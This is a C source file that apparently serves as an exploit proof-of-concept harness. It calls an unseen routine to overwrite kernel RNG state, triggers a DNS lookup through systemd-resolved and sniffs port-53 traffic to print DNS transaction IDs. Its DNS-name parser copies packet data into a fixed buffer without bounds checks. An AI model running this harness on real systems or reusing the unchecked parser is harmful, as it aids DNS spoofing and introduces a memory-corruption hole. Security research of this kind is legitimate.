#ifdef USE_PCAP
#include <pcap.h>
#include <pthread.h>
#endif /* USE_PCAP */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <systemd/sd-bus.h>
#include "libprimitive.h"

#ifdef USE_PCAP
static pthread_mutex_t txn_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t txn_cond = PTHREAD_COND_INITIALIZER;
static int capture_count = 0;

/* Arguments for the capture thread */
struct cap_thread_args {
  char *interface;
 // char *dst_ip;
 // char *src_ip;
 // int dst_port;
 // int src_port;
  pcap_t *pcap_handle;
};

/* Basic ethernet header size */
#define ETH_HDR_SIZE 16

/* Timeout for pcap_open_live/pcap_dispatch */
#define PCAP_TIMEOUT  1000 /* ms */
#endif /* USE_PCAP */

#define handle_error(msg) \
  do { perror(msg); exit(EXIT_FAILURE); } while (0)

#ifdef USE_PCAP
static void print_udp_hdr(const struct udphdr *hdr)
{
    uint16_t src_port = ntohs(hdr->source);
    uint16_t dst_port = ntohs(hdr->dest);
    uint16_t length   = ntohs(hdr->len);
    uint16_t checksum = ntohs(hdr->check);

    printf("[C] UDP packet:\n");
    printf("  ...    0                   1                   2                   3\n");
    printf("  ...    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n");
    printf("  ...   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n");
    printf("  ...   |     Source Port (%-5u)     |    Destination Port (%-5u)     |\n",
            src_port, dst_port);
    printf("  ...   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n");
    printf("  ...   |       Length (%-5u)        |        Checksum (%#06x)        |\n",
            length, checksum);
    printf("  ...   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n");
}

static void print_dns_question(const u_char *dns_payload)
{
    const u_char *qname = dns_payload + sizeof(HEADER); /* The question starts
                                                         * right after the 12B
                                                         * DNS header */
    char name_buffer[256];
    int buffer_offset = 0;
    int name_part_len = *qname++;
    int i;

    if (name_part_len == 0) {
        printf("(root)");
        return;
    }

    // TODO: cleanup and comment

    while (name_part_len > 0) {
        /* Copy the label part */
        for (i = 0; i < name_part_len; i++) {
            name_buffer[buffer_offset++] = *qname++;
        }
        /* Add a dot for the next part */
        name_buffer[buffer_offset++] = '.';

        /* Get length of the next part */
        name_part_len = *qname++;
    }

    /* Replace final dot with null terminator */
    name_buffer[buffer_offset - 1] = '\0';
    printf(" Question: %s", name_buffer);
}

static void process_packet(u_char *user_args, const struct pcap_pkthdr *pkthdr,
                            const u_char *pkt)
{
    const struct iphdr *ip_hdr;
    const struct udphdr *udp_hdr;
    const HEADER *dns_hdr;
    const u_char *dns_payload;

    int ip_hdr_size;
    int udp_hdr_size = 8; /* UDP header is 8 bytes */

    /* Tranlsate arguments */
    struct cap_thread_args *args = (struct cap_thread_args *)user_args;

    /* Get the IP header */
    ip_hdr = (struct iphdr *)(pkt + ETH_HDR_SIZE);
    ip_hdr_size = ip_hdr->ihl * 4;

    /* Verbose */
    printf("[C] Found packet!\n");

    /* Ensure it is a UDP packet */
    if (ip_hdr->protocol != IPPROTO_IP && ip_hdr->protocol != IPPROTO_UDP) {
        printf("[C] Packet protocol (%d) is not UDP!\n", ip_hdr->protocol);
        return;
    }

    /* Get the UDP header  */
    udp_hdr = (struct udphdr *)(pkt + ETH_HDR_SIZE + ip_hdr_size);
    print_udp_hdr(udp_hdr);

    /* Get the DNS payload */
    dns_payload = (u_char *)(pkt + ETH_HDR_SIZE + ip_hdr_size + udp_hdr_size);
    dns_hdr = (HEADER *)dns_payload;

    /* We only care about standard queries with one question */
    if (ntohs(dns_hdr->qdcount) != 1) {
        printf("[C] Query has more than one question. Skipping...\n");
        return;
    }

    /* Print Transaction ID (TXN ID) */
    printf("[C] TXN ID: %u  ", ntohs(dns_hdr->id));

    /* Print whether it's a Query or Response */
    if (dns_hdr->qr == 0) {
        printf("[Query]   ");
    } else {
        printf("[Response]");
    }

    /* Print the Question section */
    print_dns_question(dns_payload);
    printf("\n");

    /* Relay that we have the TXN ID */
    pthread_mutex_lock(&txn_mutex);
    capture_count++;
    pthread_cond_signal(&txn_cond);
    pthread_mutex_unlock(&txn_mutex);

    /* Tell pcap_loop to stop looping */
    pcap_breakloop(args->pcap_handle);
}

static void *cap_thread_func(void *arg)
{
    struct cap_thread_args *args;
    int ret;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program prog;
    char filter_exp[256];
    int pkts_read;

    /* Verbose */
    printf("[C] Running packet capture thread!\n");

    /* Cast the args */
    args = (struct cap_thread_args *)arg;

    /* Open the device for capturing */
    args->pcap_handle = pcap_open_live(args->interface, IP_MAXPACKET, 1,
                                        PCAP_TIMEOUT, errbuf);
    if (args->pcap_handle == NULL) {
        printf("[!][CAP] Error: couldn't open device %s: %s\n",
                args->interface, errbuf);
        pthread_exit(NULL);
    }
    printf("[C] Opened device (%s) for capture!\n", args->interface);

    // XXX: GC
    // int link_type = pcap_datalink(args->pcap_handle);
    // int link_header_size = 0;

    // switch (link_type) {
    //   case DLT_EN10MB: // Ethernet
    //     link_header_size = 14;
    //     break;
    //   case DLT_LINUX_SLL: // Linux cooked-mode capture (often used for 'any' interface)
    //     link_header_size = 16; // Modern SLL header size
    //                            // For older libpcap/kernels it might be 12. Check your system's DLT_LINUX_SLL_SIZE.
    //     break;
    //   case DLT_NULL: // Loopback on some systems
    //     link_header_size = 4;
    //     break;
    //   case DLT_LOOP: // Loopback on other systems (e.g., BSD)
    //     link_header_size = 4;
    //     break;
    //     // Add other DLT types you might encounter
    //   default:
    //     fprintf(stderr, "[Capture Thread] Unsupported link-layer type: %d. Cannot parse headers.\n", link_type);
    //     pthread_exit(NULL); // Or handle appropriately
    // }
    // printf("datalink size: %d\n", link_header_size);

    /*
     * Create a filter expression that looks for all UDP DNS packets 
     */
    snprintf(filter_exp, sizeof(filter_exp), "udp port 53");
    printf("[C] Generated filter expression:\n  ... %s\n", filter_exp);

    /* Compile the filter expression */
    ret = pcap_compile(args->pcap_handle, &prog, filter_exp,
                        0, PCAP_NETMASK_UNKNOWN);
    if (ret == PCAP_ERROR) {
        printf("[!][CAP] Error: couldn't parse filter %s: %s\n",
                filter_exp, pcap_geterr(args->pcap_handle));
        pcap_close(args->pcap_handle);
        pthread_exit(NULL);
    }
    printf("[C] Compiled filter expression!\n");

    /* Set the filter */
    ret = pcap_setfilter(args->pcap_handle, &prog);
    if (ret != 0) {
        if (ret == PCAP_ERROR_NOT_ACTIVATED) {
            printf("[!][CAP] Error: cap handle created but not activated!\n");
        } else if (ret == PCAP_ERROR) {
            printf("[!][CAP] Error: failed to set filter %s: %s\n",
                    filter_exp, pcap_geterr(args->pcap_handle));
        } else {
            printf("[!][CAP] Error: unknown error from pcap_setfilter()\n");
        }

        pcap_close(args->pcap_handle);
        pthread_exit(NULL);
    }
    printf("[C] Filter is installed!\n");

    /* Verbose */
    printf("[C] Listening for UDP packets on port 53 (DNS)...\n");

    /* Loop through packets using pcap_dispatch with a timeout */
    while (capture_count < 2) {
        pkts_read = pcap_dispatch(args->pcap_handle, -1,
                                    (pcap_handler)process_packet,
                                    (u_char *)args);
        if (pkts_read < 0) { /* Error! */
            if (pkts_read == PCAP_ERROR_NOT_ACTIVATED) {
                printf("[!][CAP] Error: cap handle created but not activated!\n");
            } else if (pkts_read == PCAP_ERROR_BREAK) {
                /*
                 * This one is OK and we can expect this
                 */
                continue;
            } else if (pkts_read == PCAP_ERROR) {
                printf("[!][CAP] Error: pcap_dispatch() failed: %s\n",
                        pcap_geterr(args->pcap_handle));
            } else {
                printf("[!][CAP] Error: unknown error from pcap_dispatch()\n");
            }

            break;
        } else if (pkts_read == 0) { /* No packets arrived within timeout! */
            usleep(50000); /* 50ms */
        }
        /*
         * else pkts_read > 0 and pkt_handler will be called which will either
         * keep us looping or increase `capture_count` and break the loop
         */
    }

    /* Cleanup... */
    pcap_freecode(&prog);
    pcap_close(args->pcap_handle);

    printf("[C] Exiting capture thread.\n");
    pthread_exit(NULL);
}
#endif /* USE_PCAP */

int main(int argc, char*argv[])
{
#ifdef USE_PCAP
    struct cap_thread_args cap_args;
    pthread_t cap_tid;
#endif /* USE_PCAP */
    sd_bus_error error = SD_BUS_ERROR_NULL;
    sd_bus_message *reply = NULL;
    const char *canonical;
    sd_bus *bus = NULL;
    uint64_t flags;
    int r;
    char buf[INET_ADDRSTRLEN];
    int ifindex, family;
    const void *data;
    size_t length;

#ifdef USE_PCAP
    /* Setup capture thread */
    cap_args.interface   = "any"; /* capture on all interfaces */
    //cap_args.dst_ip      = SERVER_IP;
    //cap_args.src_ip      = NULL; /* determined later */
    //cap_args.dst_port    = SERVER_PORT;
    //cap_args.src_port    = 0; /* determined later */
    cap_args.pcap_handle = NULL; /* determined later */

    /* Start the packet capture thread */
    printf("[+] Starting packet capture thread...\n");
    if (pthread_create(&cap_tid, NULL, cap_thread_func, (void *)&cap_args) != 0)
        handle_error("pthread_create()");

    /* Let the thread initialize */
    sleep(1);
#endif /* USE_PCAP */

    /* Zap the KRNG state */
    trigger_overwrite_of_l1_key();

    /* Open an independent bus connection to the system bus */
    r = sd_bus_open_system(&bus);
    if (r < 0) {
        fprintf(stderr, "[!] Failed to open system bus: %s\n", strerror(-r));
        goto finish;
    }

    /* Call the D-Bus method: ResolveHostname */
    r = sd_bus_call_method(bus,
            "org.freedesktop.resolve1",
            "/org/freedesktop/resolve1",
            "org.freedesktop.resolve1.Manager",
            "ResolveHostname",
            &error,
            &reply,
            "isit",
            0,  /* Network interface index where to look (0 is any) */
            argc >= 2 ? argv[1] : "www.github.com",  /* Hostname */
            AF_INET,  /* Which address family to look for */
            UINT64_C(0));  /* Input flags parameter */
    if (r < 0) {
        fprintf(stderr, "[!] Failed to resolve hostname: %s\n", error.message);
        sd_bus_error_free(&error);
        goto finish;
    }

    /*
     * Enter the message container to get access to its contents:
     *
     *  - 'a' = array type
     *  - '(iiay)'
     *    - '()' = struct
     *    - 'i' = int32_t
     *    - 'i' = int32_t
     *    - 'ay' = array of uint8_t
     */
    r = sd_bus_message_enter_container(reply, 'a', "(iiay)");
    if (r < 0)
        goto parse_failure;

    /* Loop through the array of structs in the container we just entered */
    for (;;) {
        /*
         * Enter the reply container. Its contents are:
         *  - 'r' = struct type
         *  - 'iiay'
         *    - 'i' = int32_t
         *    - 'i' = int32_t
         *    - 'ay' = array of uint8_t
         *
         */
        r = sd_bus_message_enter_container(reply, 'r', "iiay");
        if (r < 0)
            goto parse_failure;
        if (r == 0)  /* Reached end of array */
            break;

        /* Read two int32_t values from the message into ifindex and family */
        r = sd_bus_message_read(reply, "ii", &ifindex, &family);
        if (r < 0)
            goto parse_failure;

        /* Read byte array in data and store its length in length */
        r = sd_bus_message_read_array(reply, 'y', &data, &length);
        if (r < 0)
            goto parse_failure;

        /* Exit scope of the struct container we entered */
        r = sd_bus_message_exit_container(reply);
        if (r < 0)
            goto parse_failure;

        printf("[+] Found IP address %s on interface %i.\n",
                inet_ntop(family, data, buf, sizeof(buf)), ifindex);
    }

    /* Exit scope of the array of structs container we entered */
    r = sd_bus_message_exit_container(reply);
    if (r < 0)
        goto parse_failure;

    /* Read a string and a uint64_t into canonical and flags */
    r = sd_bus_message_read(reply, "st", &canonical, &flags);
    if (r < 0)
        goto parse_failure;

    /* Verbose */
    printf("[+] Canonical name is %s\n", canonical);

#ifdef USE_PCAP
    /* Wait for the capture thread to find the TXN */
    pthread_mutex_lock(&txn_mutex);
    while (capture_count < 2) {
        printf("[o] Waiting for TXN from capture thread...\n");
        pthread_cond_wait(&txn_cond, &txn_mutex);
    }
    pthread_mutex_unlock(&txn_mutex);

    /*
     * Printing of TXN is done from the capture thread
     */

    /* Capture loop should break on its own, so we just join here */
    pthread_join(cap_tid, NULL);
#endif /* USE_PCAP */

    /* All done! Skip over the failure message */
    goto finish;

parse_failure:
    fprintf(stderr, "[!] Parse failure: %s\n", strerror(-r));

finish:
    sd_bus_message_unref(reply);
    sd_bus_flush_close_unref(bus);
    return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}

